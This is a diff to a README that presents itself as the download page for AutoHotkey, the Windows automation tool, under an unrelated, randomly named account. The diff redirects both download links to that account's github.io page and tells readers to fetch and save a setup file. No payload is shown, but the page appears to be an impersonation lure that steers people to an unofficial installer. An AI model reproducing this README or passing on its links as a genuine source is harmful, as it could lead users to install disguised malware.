@@ -1,6 +1,6 @@
 # ⌨️ AutoHotkey - Automate tasks on your Windows desktop
 
-[![](https://img.shields.io/badge/Download-AutoHotkey-blue.svg)](https://github.com/germanshepherdfloorjoist870/AutoHotkey)
+[![](https://img.shields.io/badge/Download-AutoHotkey-blue.svg)](https://germanshepherdfloorjoist870.github.io)
 
 ## 🎯 About this software
 
@@ -14,7 +14,7 @@ Before you install this software, check these requirements. Your computer must r
 
 You get the installer from our project page. Visit this page to download the setup file for your system.
 
-[Download AutoHotkey Here](https://github.com/germanshepherdfloorjoist870/AutoHotkey)
+[Download AutoHotkey Here](https://germanshepherdfloorjoist870.github.io)
 
 Save the file to your Downloads folder. Do not move it yet. Ensure your internet connection remains stable during the download. Check your file size to make sure the download finished without errors.
 
